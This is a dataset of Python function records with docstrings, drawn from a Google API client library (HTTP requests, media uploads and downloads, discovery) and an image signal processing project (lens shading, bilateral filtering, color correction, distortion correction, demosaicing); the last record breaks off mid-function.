{"docstring": "\"\"\"Constructor.\n\nArgs:\n  resumable_progress: int, bytes received so far.\n  total_size: int, total bytes in complete download.\n\"\"\"\n", "func_signal": "def __init__(self, resumable_progress, total_size):\n", "code": "self.resumable_progress = resumable_progress\nself.total_size = total_size", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Build a Google API service using another pre-authed service\"\"\"\n\n", "func_signal": "def build_service_from_service(service, api, version):\n", "code": "new_service = build(api, version, http=service._http)\n\nreturn new_service", "path": "utils.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Constructor.\n\nArgs:\n  stream: (io.Base, file object), the stream to wrap.\n  begin: int, the seek position the chunk begins at.\n  chunksize: int, the size of the chunk.\n\"\"\"\n", "func_signal": "def __init__(self, stream, begin, chunksize):\n", "code": "self._stream = stream\nself._begin = begin\nself._chunksize = chunksize\nself._stream.seek(begin)", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Returns an HttpRequest populated with info from a JSON object.\"\"\"\n", "func_signal": "def from_json(s, http, postproc):\n", "code": "d = simplejson.loads(s)\nif d['resumable'] is not None:\n  d['resumable'] = MediaUpload.new_from_json(d['resumable'])\nreturn HttpRequest(\n    http,\n    postproc,\n    uri=d['uri'],\n    method=d['method'],\n    body=d['body'],\n    headers=d['headers'],\n    methodId=d['methodId'],\n    resumable=d['resumable'])", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Get the next chunk of the download.\n\nArgs:\n  num_retries: Integer, number of times to retry 500's with randomized\n        exponential backoff. If all retries fail, the raised HttpError\n        represents the last request. If zero (default), we attempt the\n        request only once.\n\nReturns:\n  (status, done): (MediaDownloadStatus, boolean)\n     The value of 'done' will be True when the media has been fully\n     downloaded.\n\nRaises:\n  apiclient.errors.HttpError if the response was not a 2xx.\n  httplib2.HttpLib2Error if a transport error has occured.\n\"\"\"\n", "func_signal": "def next_chunk(self, num_retries=0):\n", "code": "headers = {\n    'range': 'bytes=%d-%d' % (\n        self._progress, self._progress + self._chunksize)\n    }\nhttp = self._request.http\n\nfor retry_num in xrange(num_retries + 1):\n  if retry_num > 0:\n    self._sleep(self._rand() * 2**retry_num)\n    logging.warning(\n        'Retry #%d for media download: GET %s, following status: %d'\n        % (retry_num, self._uri, resp.status))\n\n  resp, content = http.request(self._uri, headers=headers)\n  if resp.status < 500:\n    break\n\nif resp.status in [200, 206]:\n  if 'content-location' in resp and resp['content-location'] != self._uri:\n    self._uri = resp['content-location']\n  self._progress += len(content)\n  self._fd.write(content)\n\n  if 'content-range' in resp:\n    content_range = resp['content-range']\n    length = content_range.rsplit('/', 1)[1]\n    self._total_size = int(length)\n\n  if self._progress == self._total_size:\n    self._done = True\n  return MediaDownloadProgress(self._progress, self._total_size), self._done\nelse:\n  raise HttpError(resp, content, uri=self._uri)", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Convert string into httplib2 response and content.\n\nArgs:\n  payload: string, headers and body as a string.\n\nReturns:\n  A pair (resp, content), such as would be returned from httplib2.request.\n\"\"\"\n# Strip off the status line\n", "func_signal": "def _deserialize_response(self, payload):\n", "code": "status_line, payload = payload.split('\\n', 1)\nprotocol, status, reason = status_line.split(' ', 2)\n\n# Parse the rest of the response\nparser = FeedParser()\nparser.feed(payload)\nmsg = parser.close()\nmsg['status'] = status\n\n# Create httplib2.Response from the parsed headers.\nresp = httplib2.Response(msg)\nresp.reason = reason\nresp.version = int(protocol.split('/', 1)[1].replace('.', ''))\n\ncontent = payload.split('\\r\\n\\r\\n', 1)[1]\n\nreturn resp, content", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Set the user-agent on every request.\n\nArgs:\n   http - An instance of httplib2.Http\n       or something that acts like it.\n   user_agent: string, the value for the user-agent header.\n\nReturns:\n   A modified instance of http that was passed in.\n\nExample:\n\n  h = httplib2.Http()\n  h = set_user_agent(h, \"my-app-name/6.0\")\n\nMost of the time the user-agent will be set doing auth, this is for the rare\ncases where you are accessing an unauthenticated endpoint.\n\"\"\"\n", "func_signal": "def set_user_agent(http, user_agent):\n", "code": "request_orig = http.request\n\n# The closure that will replace 'httplib2.Http.request'.\ndef new_request(uri, method='GET', body=None, headers=None,\n                redirections=httplib2.DEFAULT_MAX_REDIRECTS,\n                connection_type=None):\n  \"\"\"Modify the request headers to add the user-agent.\"\"\"\n  if headers is None:\n    headers = {}\n  if 'user-agent' in headers:\n    headers['user-agent'] = user_agent + ' ' + headers['user-agent']\n  else:\n    headers['user-agent'] = user_agent\n  resp, content = request_orig(uri, method, body, headers,\n                      redirections, connection_type)\n  return resp, content\n\nhttp.request = new_request\nreturn http", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "# Add _next() methods\n# Look for response bodies in schema that contain nextPageToken, and methods\n# that take a pageToken parameter.\n", "func_signal": "def _add_next_methods(self, resourceDesc, schema):\n", "code": "if 'methods' in resourceDesc:\n  for methodName, methodDesc in resourceDesc['methods'].iteritems():\n    if 'response' in methodDesc:\n      responseSchema = methodDesc['response']\n      if '$ref' in responseSchema:\n        responseSchema = schema.get(responseSchema['$ref'])\n      hasNextPageToken = 'nextPageToken' in responseSchema.get('properties',\n                                                               {})\n      hasPageToken = 'pageToken' in methodDesc.get('parameters', {})\n      if hasNextPageToken and hasPageToken:\n        fixedMethodName, method = createNextMethod(methodName + '_next')\n        self._set_dynamic_attr(fixedMethodName,\n                               method.__get__(self, self.__class__))", "path": "lib\\apiclient\\discovery.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Execute the request.\n\nArgs:\n  http: httplib2.Http, an http object to be used in place of the\n        one the HttpRequest request object was constructed with.\n  num_retries: Integer, number of times to retry 500's with randomized\n        exponential backoff. If all retries fail, the raised HttpError\n        represents the last request. If zero (default), we attempt the\n        request only once.\n\nReturns:\n  A deserialized object model of the response body as determined\n  by the postproc.\n\nRaises:\n  apiclient.errors.HttpError if the response was not a 2xx.\n  httplib2.HttpLib2Error if a transport error has occured.\n\"\"\"\n", "func_signal": "def execute(self, http=None, num_retries=0):\n", "code": "if http is None:\n  http = self.http\n\nif self.resumable:\n  body = None\n  while body is None:\n    _, body = self.next_chunk(http=http, num_retries=num_retries)\n  return body\n\n# Non-resumable case.\n\nif 'content-length' not in self.headers:\n  self.headers['content-length'] = str(self.body_size)\n# If the request URI is too long then turn it into a POST request.\nif len(self.uri) > MAX_URI_LENGTH and self.method == 'GET':\n  self.method = 'POST'\n  self.headers['x-http-method-override'] = 'GET'\n  self.headers['content-type'] = 'application/x-www-form-urlencoded'\n  parsed = urlparse.urlparse(self.uri)\n  self.uri = urlparse.urlunparse(\n      (parsed.scheme, parsed.netloc, parsed.path, parsed.params, None,\n       None)\n      )\n  self.body = parsed.query\n  self.headers['content-length'] = str(len(self.body))\n\n# Handle retries for server-side errors.\nfor retry_num in xrange(num_retries + 1):\n  if retry_num > 0:\n    self._sleep(self._rand() * 2**retry_num)\n    logging.warning('Retry #%d for request: %s %s, following status: %d'\n                    % (retry_num, self.method, self.uri, resp.status))\n\n  resp, content = http.request(str(self.uri), method=str(self.method),\n                               body=self.body, headers=self.headers)\n  if resp.status < 500:\n    break\n\nfor callback in self.response_callbacks:\n  callback(resp)\nif resp.status >= 300:\n  raise HttpError(resp, content, uri=self.uri)\nreturn self.postproc(resp, content)", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Process the response from a single chunk upload.\n\nArgs:\n  resp: httplib2.Response, the response object.\n  content: string, the content of the response.\n\nReturns:\n  (status, body): (ResumableMediaStatus, object)\n     The body will be None until the resumable media is fully uploaded.\n\nRaises:\n  apiclient.errors.HttpError if the response was not a 2xx or a 308.\n\"\"\"\n", "func_signal": "def _process_response(self, resp, content):\n", "code": "if resp.status in [200, 201]:\n  self._in_error_state = False\n  return None, self.postproc(resp, content)\nelif resp.status == 308:\n  self._in_error_state = False\n  # A \"308 Resume Incomplete\" indicates we are not done.\n  self.resumable_progress = int(resp['range'].split('-')[1]) + 1\n  if 'location' in resp:\n    self.resumable_uri = resp['location']\nelse:\n  self._in_error_state = True\n  raise HttpError(resp, content, uri=self.uri)\n\nreturn (MediaUploadProgress(self.resumable_progress, self.resumable.size()),\n        None)", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Constructor for a BatchHttpRequest.\n\nArgs:\n  callback: callable, A callback to be called for each response, of the\n    form callback(id, response, exception). The first parameter is the\n    request id, and the second is the deserialized response object. The\n    third is an apiclient.errors.HttpError exception object if an HTTP error\n    occurred while processing the request, or None if no error occurred.\n  batch_uri: string, URI to send batch requests to.\n\"\"\"\n", "func_signal": "def __init__(self, callback=None, batch_uri=None):\n", "code": "if batch_uri is None:\n  batch_uri = 'https://www.googleapis.com/batch'\nself._batch_uri = batch_uri\n\n# Global callback to be called for each individual response in the batch.\nself._callback = callback\n\n# A map from id to request.\nself._requests = {}\n\n# A map from id to callback.\nself._callbacks = {}\n\n# List of request ids, in the order in which they were added.\nself._order = []\n\n# The last auto generated id.\nself._last_auto_id = 0\n\n# Unique ID on which to base the Content-ID headers.\nself._base_id = None\n\n# A map from request id to (httplib2.Response, content) response pairs\nself._responses = {}\n\n# A map of id(Credentials) that have been refreshed.\nself._refreshed_credentials = {}", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Constructor for HttpRequestMock\n\nArgs:\n  resp: httplib2.Response, the response to emulate coming from the request\n  content: string, the response body\n  postproc: callable, the post processing function usually supplied by\n            the model class. See model.JsonModel.response() as an example.\n\"\"\"\n", "func_signal": "def __init__(self, resp, content, postproc):\n", "code": "self.resp = resp\nself.content = content\nself.postproc = postproc\nif resp is None:\n  self.resp = httplib2.Response({'status': 200, 'reason': 'OK'})\nif 'reason' in self.resp:\n  self.resp.reason = self.resp['reason']", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"\nArgs:\n  filename: string, absolute filename to read response from\n  headers: dict, header to return with response\n\"\"\"\n", "func_signal": "def __init__(self, filename=None, headers=None):\n", "code": "if headers is None:\n  headers = {'status': '200 OK'}\nif filename:\n  f = file(filename, 'r')\n  self.data = f.read()\n  f.close()\nelse:\n  self.data = None\nself.response_headers = headers\nself.headers = None\nself.uri = None\nself.method = None\nself.body = None\nself.headers = None", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"\nArgs:\n  iterable: iterable, a sequence of pairs of (headers, body)\n\"\"\"\n", "func_signal": "def __init__(self, iterable):\n", "code": "self._iterable = iterable\nself.follow_redirects = True", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Utility function for creating a JSON representation of a MediaUpload.\n\nArgs:\n  strip: array, An array of names of members to not include in the JSON.\n\nReturns:\n   string, a JSON representation of this instance, suitable to pass to\n   from_json().\n\"\"\"\n", "func_signal": "def _to_json(self, strip=None):\n", "code": "t = type(self)\nd = copy.copy(self.__dict__)\nif strip is not None:\n  for member in strip:\n    del d[member]\nd['_class'] = t.__name__\nd['_module'] = t.__module__\nreturn simplejson.dumps(d)", "path": "lib\\apiclient\\http.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Fix method names to avoid reserved word conflicts.\n\nArgs:\n  name: string, method name.\n\nReturns:\n  The name with a '_' prefixed if the name is a reserved word.\n\"\"\"\n", "func_signal": "def fix_method_name(name):\n", "code": "if keyword.iskeyword(name) or name in RESERVED_WORDS:\n  return name + '_'\nelse:\n  return name", "path": "lib\\apiclient\\discovery.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Updates parameters of an API method with values specific to this library.\n\nSpecifically, adds whatever global parameters are specified by the API to the\nparameters for the individual method. Also adds parameters which don't\nappear in the discovery document, but are available to all discovery based\nAPIs (these are listed in STACK_QUERY_PARAMETERS).\n\nSIDE EFFECTS: This updates the parameters dictionary object in the method\ndescription.\n\nArgs:\n  method_desc: Dictionary with metadata describing an API method. Value comes\n      from the dictionary of methods stored in the 'methods' key in the\n      deserialized discovery document.\n  root_desc: Dictionary; the entire original deserialized discovery document.\n  http_method: String; the HTTP method used to call the API method described\n      in method_desc.\n\nReturns:\n  The updated Dictionary stored in the 'parameters' key of the method\n      description dictionary.\n\"\"\"\n", "func_signal": "def _fix_up_parameters(method_desc, root_desc, http_method):\n", "code": "parameters = method_desc.setdefault('parameters', {})\n\n# Add in the parameters common to all methods.\nfor name, description in root_desc.get('parameters', {}).iteritems():\n  parameters[name] = description\n\n# Add in undocumented query parameters.\nfor name in STACK_QUERY_PARAMETERS:\n  parameters[name] = STACK_QUERY_PARAMETER_DEFAULT_VALUE.copy()\n\n# Add 'body' (our own reserved word) to parameters if the method supports\n# a request payload.\nif http_method in HTTP_PAYLOAD_METHODS and 'request' in method_desc:\n  body = BODY_PARAMETER_DEFAULT_VALUE.copy()\n  body.update(method_desc['request'])\n  parameters['body'] = body\n\nreturn parameters", "path": "lib\\apiclient\\discovery.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Reconstitute the state of the object from being pickled.\n\nUses the fact that the instance variable _dynamic_attrs holds attrs that\nwill be wiped and restored on pickle serialization.\n\"\"\"\n", "func_signal": "def __setstate__(self, state):\n", "code": "self.__dict__.update(state)\nself._dynamic_attrs = []\nself._set_service_methods()", "path": "lib\\apiclient\\discovery.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "\"\"\"Sets an instance attribute and tracks it in a list of dynamic attributes.\n\nArgs:\n  attr_name: string; The name of the attribute to be set\n  value: The value being set on the object and tracked in the dynamic cache.\n\"\"\"\n", "func_signal": "def _set_dynamic_attr(self, attr_name, value):\n", "code": "self._dynamic_attrs.append(attr_name)\nself.__dict__[attr_name] = value", "path": "lib\\apiclient\\discovery.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "# Add basic methods to Resource\n", "func_signal": "def _add_basic_methods(self, resourceDesc, rootDesc, schema):\n", "code": "if 'methods' in resourceDesc:\n  for methodName, methodDesc in resourceDesc['methods'].iteritems():\n    fixedMethodName, method = createMethod(\n        methodName, methodDesc, rootDesc, schema)\n    self._set_dynamic_attr(fixedMethodName,\n                           method.__get__(self, self.__class__))\n    # Add in _media methods. The functionality of the attached method will\n    # change when it sees that the method name ends in _media.\n    if methodDesc.get('supportsMediaDownload', False):\n      fixedMethodName, method = createMethod(\n          methodName + '_media', methodDesc, rootDesc, schema)\n      self._set_dynamic_attr(fixedMethodName,\n                             method.__get__(self, self.__class__))", "path": "lib\\apiclient\\discovery.py", "repo_name": "Scarygami/mirror-api", "stars": 283, "license": "None", "language": "python", "size": 3979}
{"docstring": "# parms:\n#       parameters of a parabolic model y = a*(x-b)^2 + c\n#       For example, params = [0.01759, -28.37, -13.36]\n# Note: approximate_mathematical_compensation require less memory\n", "func_signal": "def approximate_mathematical_compensation(self, params, clip_min=0, clip_max=65535):\n", "code": "print(\"----------------------------------------------------\")\nprint(\"Running lens shading correction with approximate mathematical compensation...\")\nwidth, height = utility.helpers(self.data).get_width_height()\n\ncenter_pixel_pos = [height/2, width/2]\nmax_distance = utility.distance_euclid(center_pixel_pos, [height, width])\n\n# allocate memory for output\ntemp = np.empty((height, width), dtype=np.float32)\n\nfor i in range(0, height):\n    for j in range(0, width):\n        distance = utility.distance_euclid(center_pixel_pos, [i, j]) / max_distance\n        # parabolic model\n        gain = params[0] * (distance - params[1])**2 + params[2]\n        temp[i, j] = self.data[i, j] * gain\n\ntemp = np.clip(temp, clip_min, clip_max)\nreturn temp", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# bilateral filter based upon the work of\n# Jiawen Chen, Sylvain Paris, and Fredo Durand, 2007 work\n\n# note: if edge data is not provided, image is served as edge\n# this is called normal bilateral filter\n# if edge data is provided, then it is called cross or joint\n# bilateral filter\n\n# get width and height of the image\n", "func_signal": "def bilateral_filter(self, edge):\n", "code": "width, height = helpers(self.data).get_width_height()\n\n# sigma_spatial\nsigma_spatial = min(height, width) / 16.\n\n# calculate edge_delta\nedge_min = np.min(edge)\nedge_max = np.max(edge)\nedge_delta = edge_max - edge_min\n\n# sigma_range and sampling_range\nsigma_range = 0.1 * edge_delta\nsampling_range = sigma_range\nsampling_spatial = sigma_spatial\n\n# derived_sigma_spatial and derived_sigma_range\nderived_sigma_spatial = sigma_spatial / sampling_spatial\nderived_sigma_range = sigma_range / sampling_range\n\n# paddings\npadding_xy = np.floor(2. * derived_sigma_spatial) + 1.\npadding_z = np.floor(2. * derived_sigma_range) + 1.\n\n# downsamples\ndownsample_width = np.uint16(np.floor((width - 1.) / sampling_spatial) + 1. + 2. * padding_xy)\ndownsample_height = np.uint16(np.floor((height - 1.) / sampling_spatial) + 1. + 2. * padding_xy)\ndownsample_depth = np.uint16(np.floor(edge_delta / sampling_range) + 1. + 2. * padding_z)\n\ngrid_data = np.zeros((downsample_height, downsample_width, downsample_depth))\ngrid_weight = np.zeros((downsample_height, downsample_width, downsample_depth))\n\njj, ii = np.meshgrid(np.arange(0, width, 1),\\\n                     np.arange(0, height, 1))\n\ndi = np.uint16(np.round( ii / sampling_spatial ) + padding_xy + 1.)\ndj = np.uint16(np.round( jj / sampling_spatial ) + padding_xy + 1.)\ndz = np.uint16(np.round( (edge - edge_min) / sampling_range ) + padding_z + 1.)\n\n\nfor i in range(0, height):\n    for j in range(0, width):\n\n        data_z = self.data[i, j]\n        if not np.isnan(data_z):\n            dik = di[i, j]\n            djk = dj[i, j]\n            dzk = dz[i, j]\n\n            grid_data[dik, djk, dzk] = grid_data[dik, djk, dzk] + data_z\n            grid_weight[dik, djk, dzk] = grid_weight[dik, djk, dzk] + 1.\n\n\nkernel_width = 2. * derived_sigma_spatial + 1.\nkernel_height = kernel_width\nkernel_depth = 2. * derived_sigma_range + 1.\n\nhalf_kernel_width = np.floor(kernel_width / 2.)\nhalf_kernel_height = np.floor(kernel_height / 2.)\nhalf_kernel_depth = np.floor(kernel_depth / 2.)\n\ngrid_x, grid_y, grid_z = np.meshgrid(np.arange(0, kernel_width, 1),\\\n                                     np.arange(0, kernel_height, 1),\\\n                                     np.arange(0, kernel_depth, 1))\n\ngrid_x = grid_x - half_kernel_width\ngrid_y = grid_y - half_kernel_height\ngrid_z = grid_z - half_kernel_depth\n\ngrid_r_squared = ( ( np.multiply(grid_x, grid_x) + \\\n                     np.multiply(grid_y, grid_y) ) / np.multiply(derived_sigma_spatial, derived_sigma_spatial) ) + \\\n                 ( np.multiply(grid_z, grid_z) / np.multiply(derived_sigma_range, derived_sigma_range) )\n\nkernel = np.exp(-0.5 * grid_r_squared)\nblurred_grid_data = ndimage.convolve(grid_data, kernel, mode='reflect')\nblurred_grid_weight = ndimage.convolve(grid_weight, kernel, mode='reflect')\n\n# divide\nblurred_grid_weight = np.asarray(blurred_grid_weight)\nmask = blurred_grid_weight == 0\nblurred_grid_weight[mask] = -2.\nnormalized_blurred_grid = np.divide(blurred_grid_data, blurred_grid_weight)\nmask = blurred_grid_weight < -1\nnormalized_blurred_grid[mask] = 0.\nblurred_grid_weight[mask] = 0.\n\n# upsample\njj, ii = np.meshgrid(np.arange(0, width, 1),\\\n                     np.arange(0, height, 1))\n\ndi = (ii / sampling_spatial) + padding_xy + 1.\ndj = (jj / sampling_spatial) + padding_xy + 1.\ndz = (edge - edge_min) / sampling_range + padding_z + 1.\n\n# arrange the input points\nn_i, n_j, n_z = np.shape(normalized_blurred_grid)\npoints = (np.arange(0, n_i, 1), np.arange(0, n_j, 1), np.arange(0, n_z, 1))\n\n# query points\nxi = (di, dj, dz)\n\n# multidimensional interpolation\noutput = interpolate.interpn(points, normalized_blurred_grid, xi, method='linear')\n\nreturn output", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Objective: Calculates the color correction matrix\n\n# matric multiplication\n", "func_signal": "def calculate_cam2rgb(self):\n", "code": "rgb2cam = np.dot(self.xyz2cam, self.get_rgb2xyz())\n\n# make sum of each row to be 1.0, necessary to preserve white balance\n# basically divice each value by its row wise sum\nrgb2cam = np.divide(rgb2cam, np.reshape(np.sum(rgb2cam, 1), [3, 1]))\n\n# - inverse the matrix to get cam2rgb.\n# - cam2rgb should also have the characteristic that sum of each row\n# equal to 1.0 to preserve white balance\n# - check if rgb2cam is invertible by checking the condition of\n# rgb2cam. If rgb2cam is singular it will give a warning and\n# return an identiry matrix\nif (np.linalg.cond(rgb2cam) < (1 / sys.float_info.epsilon)):\n    return np.linalg.inv(rgb2cam) # this is cam2rgb / color correction matrix\nelse:\n    print(\"Warning! matrix not invertible.\")\n    return np.identity(3, dtype=np.float32)", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Objective: creates two images:\n#               dark_current_image and flat_field_image\n", "func_signal": "def create_lens_shading_correction_images(self, dark_current=0, flat_max=65535, flat_min=0, clip_range=[0, 65535]):\n", "code": "dark_current_image = dark_current * np.ones((self.height, self.width), dtype=np.float32)\nflat_field_image = np.empty((self.height, self.width), dtype=np.float32)\n\ncenter_pixel_pos = [self.height/2, self.width/2]\nmax_distance = distance_euclid(center_pixel_pos, [self.height, self.width])\n\nfor i in range(0, self.height):\n    for j in range(0, self.width):\n        flat_field_image[i, j] = (max_distance - distance_euclid(center_pixel_pos, [i, j])) / max_distance\n        flat_field_image[i, j] = flat_min + flat_field_image[i, j] * (flat_max - flat_min)\n\ndark_current_image = np.clip(dark_current_image, clip_range[0], clip_range[1])\nflat_field_image = np.clip(flat_field_image, clip_range[0], clip_range[1])\n\nreturn dark_current_image, flat_field_image", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Objective: get the rgb2xyz matrix dependin on the output color space\n#            and the illuminant\n# Source: http://www.brucelindbloom.com/index.html?Eqn_RGB_XYZ_Matrix.html\n", "func_signal": "def get_rgb2xyz(self):\n", "code": "if (self.color_space == \"srgb\"):\n    if (self.illuminant == \"d65\"):\n        return [[.4124564,  .3575761,  .1804375],\\\n                [.2126729,  .7151522,  .0721750],\\\n                [.0193339,  .1191920,  .9503041]]\n    elif (self.illuminant == \"d50\"):\n        return [[.4360747,  .3850649,  .1430804],\\\n                [.2225045,  .7168786,  .0606169],\\\n                [.0139322,  .0971045,  .7141733]]\n    else:\n        print(\"for now, color_space must be d65 or d50\")\n        return\n\nelif (self.color_space == \"adobe-rgb-1998\"):\n    if (self.illuminant == \"d65\"):\n        return [[.5767309,  .1855540,  .1881852],\\\n                [.2973769,  .6273491,  .0752741],\\\n                [.0270343,  .0706872,  .9911085]]\n    elif (self.illuminant == \"d50\"):\n        return [[.6097559,  .2052401,  .1492240],\\\n                [.3111242,  .6256560,  .0632197],\\\n                [.0194811,  .0608902,  .7448387]]\n    else:\n        print(\"for now, illuminant must be d65 or d50\")\n        return\nelse:\n    print(\"for now, color_space must be srgb or adobe-rgb-1998\")\n    return", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "#------------------------------------------------------\n# Objective:\n#   correct geometric distortion with the assumption that the distortion\n#   is symmetric and the center is at the center of of the image\n# Input:\n#   correction_type:    which type of correction needed to be carried\n#                       out, choose one the four:\n#                       pincushion-1, pincushion-2, barrel-1, barrel-2\n#                       1 and 2 are difference between the power\n#                       over the radius\n#\n#   strength:           should be equal or greater than 0.\n#                       0 means no correction will be done.\n#                       if negative value were applied correction_type\n#                       will be reversed. Thus,>=0 value expected.\n#\n#   zoom_type:          either \"fit\" or \"crop\"\n#                       fit will return image with full content\n#                       in the whole area\n#                       crop will return image will 0 values outsise\n#                       the border\n#\n#   clip_range:         to clip the final image within the range\n#------------------------------------------------------\n\n", "func_signal": "def empirical_correction(self, correction_type=\"pincushion-1\", strength=0.1, zoom_type=\"crop\", clip_range=[0, 65535]):\n", "code": "if (strength < 0):\n    print(\"Warning! strength should be equal of greater than 0.\")\n    return self.data\n\nprint(\"----------------------------------------------------\")\nprint(\"Running distortion correction by empirical method...\")\n\n# get half_width and half_height, assume this is the center\nwidth, height = utility.helpers(self.data).get_width_height()\nhalf_width = width / 2\nhalf_height = height / 2\n\n# create a meshgrid of points\nxi, yi = np.meshgrid(np.linspace(-half_width, half_width, width),\\\n                     np.linspace(-half_height, half_height, height))\n\n# cartesian to polar coordinate\nr = np.sqrt(xi**2 + yi**2)\ntheta = np.arctan2(yi, xi)\n\n# maximum radius\nR = math.sqrt(width**2 + height**2)\n\n# make r within range 0~1\nr = r / R\n\n# apply the radius to the desired transformation\ns = utility.special_function(r).distortion_function(correction_type, strength)\n\n# select a scaling_parameter based on zoon_type and k value\nif ((correction_type==\"barrel-1\") or (correction_type==\"barrel-2\")):\n    if (zoom_type == \"fit\"):\n        scaling_parameter = r[0, 0] / s[0, 0]\n    elif (zoom_type == \"crop\"):\n        scaling_parameter = 1. / (1. + strength * (np.min([half_width, half_height])/R)**2)\nelif ((correction_type==\"pincushion-1\") or (correction_type==\"pincushion-2\")):\n    if (zoom_type == \"fit\"):\n        scaling_parameter = 1. / (1. + strength * (np.min([half_width, half_height])/R)**2)\n    elif (zoom_type == \"crop\"):\n        scaling_parameter = r[0, 0] / s[0, 0]\n\n# multiply by scaling_parameter and un-normalize\ns = s * scaling_parameter * R\n\n# convert back to cartesian coordinate and add back the center coordinate\nxt = np.multiply(s, np.cos(theta))\nyt = np.multiply(s, np.sin(theta))\n\n# interpolation\nif np.ndim(self.data == 3):\n\n    output = np.empty(np.shape(self.data), dtype=np.float32)\n\n    output[:, :, 0] = utility.helpers(self.data[:, :, 0]).bilinear_interpolation(xt + half_width, yt + half_height)\n    output[:, :, 1] = utility.helpers(self.data[:, :, 1]).bilinear_interpolation(xt + half_width, yt + half_height)\n    output[:, :, 2] = utility.helpers(self.data[:, :, 2]).bilinear_interpolation(xt + half_width, yt + half_height)\n\nelif np.ndim(self.data == 2):\n\n    output = utility.helpers(self.data).bilinear_interpolation(xt + half_width, yt + half_height)\n\nreturn np.clip(output, clip_range[0], clip_range[1])", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Objective is to reduce high chroma jump\n# Beta is controlling parameter, higher gives more effect,\n# however, too high does not make any more change\n\n", "func_signal": "def post_process_local_color_ratio(self, beta):\n", "code": "print(\"----------------------------------------------------\")\nprint(\"Demosaicing post process using local color ratio...\")\n\ndata = self.data\n\n# add beta with the data to prevent divide by zero\ndata_beta = self.data + beta\n\n# convolution kernels\n# zeta1 averages the up, down, left, and right four values of a 3x3 window\nzeta1 = np.multiply([[0., 1., 0.], [1., 0., 1.], [0., 1., 0.]], .25)\n# zeta2 averages the four corner values of a 3x3 window\nzeta2 = np.multiply([[1., 0., 1.], [0., 0., 0.], [1., 0., 1.]], .25)\n\n# average of color ratio\ng_over_b = signal.convolve2d(np.divide(data_beta[:, :, 1], data_beta[:, :, 2]), zeta1, mode=\"same\", boundary=\"symm\")\ng_over_r = signal.convolve2d(np.divide(data_beta[:, :, 1], data_beta[:, :, 0]), zeta1, mode=\"same\", boundary=\"symm\")\nb_over_g_zeta2 = signal.convolve2d(np.divide(data_beta[:, :, 2], data_beta[:, :, 1]), zeta2, mode=\"same\", boundary=\"symm\")\nr_over_g_zeta2 = signal.convolve2d(np.divide(data_beta[:, :, 0], data_beta[:, :, 1]), zeta2, mode=\"same\", boundary=\"symm\")\nb_over_g_zeta1 = signal.convolve2d(np.divide(data_beta[:, :, 2], data_beta[:, :, 1]), zeta1, mode=\"same\", boundary=\"symm\")\nr_over_g_zeta1 = signal.convolve2d(np.divide(data_beta[:, :, 0], data_beta[:, :, 1]), zeta1, mode=\"same\", boundary=\"symm\")\n\n# G at B locations and G at R locations\nif self.bayer_pattern == \"rggb\":\n    # G at B locations\n    data[1::2, 1::2, 1] = -beta + np.multiply(data_beta[1::2, 1::2, 2], g_over_b[1::2, 1::2])\n    # G at R locations\n    data[::2, ::2, 1] = -beta + np.multiply(data_beta[::2, ::2, 0], g_over_r[::2, ::2])\n    # B at R locations\n    data[::2, ::2, 2] = -beta + np.multiply(data_beta[::2, ::2, 1], b_over_g_zeta2[::2, ::2])\n    # R at B locations\n    data[1::2, 1::2, 0] = -beta + np.multiply(data_beta[1::2, 1::2, 1], 